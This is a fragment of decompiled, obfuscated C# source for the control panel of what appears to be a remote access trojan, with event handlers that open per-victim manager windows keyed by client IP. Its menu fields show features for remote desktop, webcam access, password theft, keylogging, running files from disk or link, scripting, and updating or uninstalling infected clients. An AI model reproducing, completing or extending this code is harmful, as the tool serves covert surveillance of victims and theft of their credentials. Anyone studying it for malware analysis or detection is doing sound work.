			\u000E\u2000.\u0003 u = global::\u000E\u2000.\u0002(global::\u0006\u2001.\u0002(-1829137222), null);
			try
			{
				foreach (object obj in this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					global::\u000E\u2000.\u0002((Client)dataGridViewRow.Tag, u, false);
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		// Token: 0x060001F7 RID: 503 RVA: 0x00019EF0 File Offset: 0x000180F0
		private void \u0008\u2002(object \u0002, EventArgs \u0003)
		{
			new STNG
			{
				StartPosition = FormStartPosition.CenterParent
			}.ShowDialog(this);
		}

		// Token: 0x060001F8 RID: 504 RVA: 0x00019F14 File Offset: 0x00018114
		private void \u0006\u2002(object \u0002, EventArgs \u0003)
		{
			try
			{
				foreach (object obj in this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					Client client = (Client)dataGridViewRow.Tag;
					if (client != null)
					{
						Manager manager = (Manager)global::\u000E\u2000.\u0002(global::\u0006\u2001.\u0002(-1829137268) + client.ip());
						if (manager == null)
						{
							new Manager
							{
								sk = client,
								Name = global::\u0006\u2001.\u0002(-1829137268) + client.ip()
							}.Show();
						}
						else
						{
							manager.WindowState = FormWindowState.Minimized;
							manager.WindowState = FormWindowState.Normal;
						}
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		// Token: 0x060001F9 RID: 505 RVA: 0x00019FF4 File Offset: 0x000181F4
		private void \u0002(object \u0002, DataGridViewColumnEventArgs \u0003)
		{
			if (\u0003.Column.Index == 0)
			{
				if (\u0003.Column.Width > 250)
				{
					\u0003.Column.Width = 250;
				}
				if (\u0003.Column.Width < 35)
				{
					\u0003.Column.Width = 35;
				}
				this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().\u0002(checked((int)Math.Round(unchecked((double)\u0003.Column.Width * 0.67))));
			}
		}

		// Token: 0x060001FA RID: 506 RVA: 0x0001A080 File Offset: 0x00018280
		private void \u0002(object \u0002, MouseEventArgs \u0003)
		{
			try
			{
				Interaction.AppActivate(this.Text);
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x060001FB RID: 507 RVA: 0x0001A0C0 File Offset: 0x000182C0
		private void \u000E\u2002(object \u0002, EventArgs \u0003)
		{
			try
			{
				Interaction.AppActivate(this.Text);
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x060001FC RID: 508 RVA: 0x0001A100 File Offset: 0x00018300
		private void \u000F\u2002(object \u0002, EventArgs \u0003)
		{
			Process.Start(Application.ExecutablePath);
			this.Close();
		}

		// Token: 0x060001FD RID: 509 RVA: 0x0001A114 File Offset: 0x00018314
		private void \u0002\u2003(object \u0002, EventArgs \u0003)
		{
			this.Close();
		}

		// Token: 0x04000133 RID: 307
		[AccessedThroughProperty("Timer1")]
		private System.Windows.Forms.Timer \u0003;

		// Token: 0x04000134 RID: 308
		[AccessedThroughProperty("StatusStrip1")]
		private StatusStrip \u0005;

		// Token: 0x04000135 RID: 309
		[AccessedThroughProperty("ToolStripStatusLabel1")]
		private ToolStripStatusLabel \u0008;

		// Token: 0x04000136 RID: 310
		[AccessedThroughProperty("ToolStripStatusLabel3")]
		private ToolStripStatusLabel \u0006;

		// Token: 0x04000137 RID: 311
		[AccessedThroughProperty("ContextMenuStrip1")]
		private ContextMenuStrip \u000E;

		// Token: 0x04000138 RID: 312
		[AccessedThroughProperty("ServerToolStripMenuItem")]
		private ToolStripMenuItem \u000F;

		// Token: 0x04000139 RID: 313
		[AccessedThroughProperty("UpdateToolStripMenuItem")]
		private ToolStripMenuItem \u0002\u2000;

		// Token: 0x0400013A RID: 314
		[AccessedThroughProperty("UninstallToolStripMenuItem")]
		private ToolStripMenuItem \u0003\u2000;

		// Token: 0x0400013B RID: 315
		[AccessedThroughProperty("RestartToolStripMenuItem")]
		private ToolStripMenuItem \u0005\u2000;

		// Token: 0x0400013C RID: 316
		[AccessedThroughProperty("CloseToolStripMenuItem")]
		private ToolStripMenuItem \u0008\u2000;

		// Token: 0x0400013D RID: 317
		[AccessedThroughProperty("DisconnectToolStripMenuItem")]
		private ToolStripMenuItem \u0006\u2000;

		// Token: 0x0400013E RID: 318
		[AccessedThroughProperty("FromDISKToolStripMenuItem")]
		private ToolStripMenuItem \u000E\u2000;

		// Token: 0x0400013F RID: 319
		[AccessedThroughProperty("FromLINKToolStripMenuItem")]
		private ToolStripMenuItem \u000F\u2000;

		// Token: 0x04000140 RID: 320
		[AccessedThroughProperty("RenameToolStripMenuItem")]
		private ToolStripMenuItem \u0002\u2001;

		// Token: 0x04000141 RID: 321
		[AccessedThroughProperty("RemoteDesktopToolStripMenuItem")]
		private ToolStripMenuItem \u0003\u2001;

		// Token: 0x04000142 RID: 322
		[AccessedThroughProperty("RemoteCamToolStripMenuItem1")]
		private ToolStripMenuItem \u0005\u2001;

		// Token: 0x04000143 RID: 323
		[AccessedThroughProperty("GetPasswordsToolStripMenuItem")]
		private ToolStripMenuItem \u0008\u2001;

		// Token: 0x04000144 RID: 324
		[AccessedThroughProperty("KeyloggerToolStripMenuItem")]
		private ToolStripMenuItem \u0006\u2001;

		// Token: 0x04000145 RID: 325
		[AccessedThroughProperty("ToolStripStatusLabel4")]
		private ToolStripStatusLabel \u000E\u2001;

		// Token: 0x04000146 RID: 326
		[AccessedThroughProperty("OpenChatToolStripMenuItem")]
		private ToolStripMenuItem \u000F\u2001;

		// Token: 0x04000147 RID: 327
		[AccessedThroughProperty("OpenFolderToolStripMenuItem")]
		private ToolStripMenuItem \u0002\u2002;

		// Token: 0x04000148 RID: 328
		[AccessedThroughProperty("RunFileToolStripMenuItem")]
		private ToolStripMenuItem \u0003\u2002;

		// Token: 0x04000149 RID: 329
		[AccessedThroughProperty("FromLinkToolStripMenuItem1")]
		private ToolStripMenuItem \u0005\u2002;

		// Token: 0x0400014A RID: 330
		[AccessedThroughProperty("FromDiskToolStripMenuItem1")]
		private ToolStripMenuItem \u0008\u2002;

		// Token: 0x0400014B RID: 331
		[AccessedThroughProperty("ScriptToolStripMenuItem")]
		private ToolStripMenuItem \u0006\u2002;

		// Token: 0x0400014C RID: 332
		[AccessedThroughProperty("upl")]
		private ToolStripStatusLabel \u000E\u2002;

		// Token: 0x0400014D RID: 333
		[AccessedThroughProperty("dwn")]
		private ToolStripStatusLabel \u000F\u2002;

		// Token: 0x0400014E RID: 334
		[AccessedThroughProperty("conz")]
		private ToolStripStatusLabel \u0002\u2003;

		// Token: 0x0400014F RID: 335
		[AccessedThroughProperty("ToolStripMenuItem1")]
		private ToolStripMenuItem \u0003\u2003;

		// Token: 0x04000150 RID: 336
		[AccessedThroughProperty("ToolStripStatusLabel5")]
		private ToolStripStatusLabel \u0005\u2003;

		// Token: 0x04000151 RID: 337
		[AccessedThroughProperty("Pp1")]
		private \u0008\u2000 \u0008\u2003;

		// Token: 0x04000152 RID: 338
		[AccessedThroughProperty("IMG2")]
		private ImageList \u0006\u2003;

		// Token: 0x04000153 RID: 339
		[AccessedThroughProperty("ManagerToolStripMenuItem")]
		private ToolStripMenuItem \u000E\u2003;

		// Token: 0x04000154 RID: 340
		[AccessedThroughProperty("L1")]
		private \u0005\u2001 \u000F\u2003;

		// Token: 0x04000155 RID: 341
		[AccessedThroughProperty("N")]
		private NotifyIcon \u0002\u2004;

		// Token: 0x04000156 RID: 342
		[AccessedThroughProperty("ContextMenuStrip2")]
		private ContextMenuStrip \u0003\u2004;

		// Token: 0x04000157 RID: 343
		[AccessedThroughProperty("ShowToolStripMenuItem")]
		private ToolStripMenuItem \u0005\u2004;

		// Token: 0x04000158 RID: 344
		[AccessedThroughProperty("RestartToolStripMenuItem1")]
		private ToolStripMenuItem \u0008\u2004;

		// Token: 0x04000159 RID: 345
		[AccessedThroughProperty("ExitToolStripMenuItem")]
		private ToolStripMenuItem \u0006\u2004;

		// Token: 0x0400015A RID: 346
		public SK S;

		// Token: 0x0400015B RID: 347
		public int port;

		// Token: 0x0400015C RID: 348
		public bool isActive;

		// Token: 0x0400015D RID: 349
		private int \u000E\u2004;
	}
}
